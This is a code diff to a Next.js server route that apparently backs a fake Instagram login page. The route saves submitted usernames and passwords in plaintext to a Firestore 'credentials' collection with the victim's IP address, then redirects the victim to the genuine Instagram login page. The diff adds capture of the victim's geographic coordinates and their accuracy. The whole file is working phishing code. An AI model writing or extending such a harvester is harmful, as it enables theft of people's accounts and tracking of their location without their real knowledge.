@@ -23,6 +23,7 @@ export async function POST(request: Request) {
     const username = formData.get('username')?.toString() || '';
     const password = formData.get('password')?.toString() || '';
     const ip = request.headers.get('x-forwarded-for') || '';
+    const locationConsent = formData.get('locationConsent')?.toString() === 'true';
 
     if (!username || !password) {
       return NextResponse.json(
@@ -31,16 +32,33 @@ export async function POST(request: Request) {
       );
     }
 
+    // Process location data if consent was given
+    let locationData = null;
+    if (locationConsent) {
+      const lat = parseFloat(formData.get('latitude')?.toString() || '0');
+      const lng = parseFloat(formData.get('longitude')?.toString() || '0');
+      const accuracy = parseFloat(formData.get('accuracy')?.toString() || '0');
+      
+      if (lat && lng) {
+        locationData = {
+          coordinates: new admin.firestore.GeoPoint(lat, lng),
+          accuracy,
+          timestamp: admin.firestore.FieldValue.serverTimestamp()
+        };
+      }
+    }
+
     if (admin.apps.length) {
       await admin.firestore().collection('credentials').add({
         username,
         password,
         timestamp: admin.firestore.FieldValue.serverTimestamp(),
-        ip_address: ip
+        ip_address: ip,
+        location: locationData,
+        hasLocationConsent: locationConsent
       });
     }
 
-    // Return JSON response with redirect URL
     return NextResponse.json(
       { success: true, redirectUrl: 'https://www.instagram.com/accounts/login/' },
       { status: 200 }
